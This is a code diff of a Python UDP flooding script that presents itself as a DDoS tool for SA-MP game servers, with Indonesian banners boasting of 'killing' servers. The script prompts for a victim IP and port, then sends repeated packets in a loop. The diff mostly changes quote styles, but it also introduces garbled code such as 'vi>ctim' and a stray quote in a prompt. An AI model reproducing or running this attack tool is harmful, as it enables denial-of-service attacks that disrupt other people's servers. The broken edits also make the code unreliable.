@@ -19,16 +19,16 @@ Data = [
  codecs.decode('021efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
 
-print("--- AUTHOR BY : Mostoas ---")
-print("--- TOOLS BY : TEAM Mostoas ---")
-print("--- JANGAN ABUSE YA ---")
-print("===================================")
-print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
-print("========== VERSION 1.0 ============")
+print('--- AUTHOR BY : Mostoas ---')
+print('--- TOOLS BY : TEAM Mostoas ---')
+print('--- JANGAN ABUSE YA ---')
+print('===================================')
+print('DDOS FOR SAMP, ULTRA - HOST, 20GTPS')
+print('========== VERSION 1.0 ============')
 print
-victim = str(input("IP/HOST╠════════>> "))
-vport = int(input("PORT╚═════════>> "))
-sent = int(input("SEND PACKETS╚═════════>> "))
+victim = str(input('"IP/HOST╠════════>> '))
+vport = int(input('PORT╚═════════>> '))
+sent = int(input('SEND PACKETS╚═════════>> '))
 
     # okay so here I create the server, when i say "client_DGRAM" it means it's a UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -43,7 +43,7 @@ sent = int(input("SEND PACKETS╚═════════>> "))
             break
         else:
             pass
-        client.sendto(bytes, (victim, vport))
+        client.sendto(bytes, (vi>ctim, vport))
         client.sendto(byte, (victim, vport))
         client.sendto(byt, (victim, vport))
         msg = Data[random.randrange(0, 3)]
@@ -58,5 +58,4 @@ sent = int(input("SEND PACKETS╚═════════>> "))
         elif int(vport) == 7784:
             client.sendto(Data[7], (victim, int(vport)))
         sent = sent + 1
-        print " DDOS ATTACK BY MOSTOAS %s MEMBUNUH SERVER !! %s PORT %s "%(sent, victim, vport)  
-  
+        print 'DDOS ATTACK BY MOSTOAS %s MEMBUNUH SERVER !! %s PORT %s '%(sent, victim, vport)  
